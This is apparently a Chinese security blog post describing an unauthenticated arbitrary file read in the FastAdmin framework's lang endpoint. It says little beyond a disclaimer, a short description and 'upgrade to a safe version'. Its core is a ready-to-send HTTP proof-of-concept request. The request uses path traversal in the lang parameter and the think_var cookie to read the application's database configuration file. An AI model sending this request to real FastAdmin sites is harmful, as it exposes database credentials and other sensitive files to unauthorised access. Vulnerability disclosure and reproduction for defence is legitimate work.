#  Fastadmin框架任意文件读取漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-02 16:12  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
01  
  
—  
  
漏洞名称  
  
  
# Fastadmin框架任意文件读取漏洞  
  
  
#   
  
  
02  
  
—  
  
影响版本  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIx4W8J0QTbck1e0YcBXo70EQYWd6kxvmyX0UzW0Glnib9al6exiapMY0cBiazHujyFpb5g7wdWiaGbQQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
FastAdmin  
后台框架  
开源且可以免费商用，一键生成  
 CRUD  
,FastAdmin  
是一款基于  
ThinkPHP   
和  
 Bootstrap   
的极速后台开发框架，基于  
Auth  
验证的权限管理系  
统,一键生成  
 CRU  
D  
,自动生成控制器、模型、视图JS  
、语言包、菜单、回收站等。  
FastAdmin框架的lang  
接口存在任意文件读取漏洞，该漏洞允许未授权攻击者通过构造特定请求读取系统敏感文件，如数据库配置文件、系统配置文件等。  
  
  
04  
  
—  
  
资产测绘  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIx4W8J0QTbck1e0YcBXo70GzJC1VLvOSeNM1ZlLHwibFkOCdLomOPXJXxOEasSIIYVpf7RK8mdlibg/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIx4W8J0QTbck1e0YcBXo70SdYWRc75z1icJh4cLMWjPicqtRUZLibOmm7EzebiaVPlRdSCI7IziakibZEQ/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
  
升级到安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
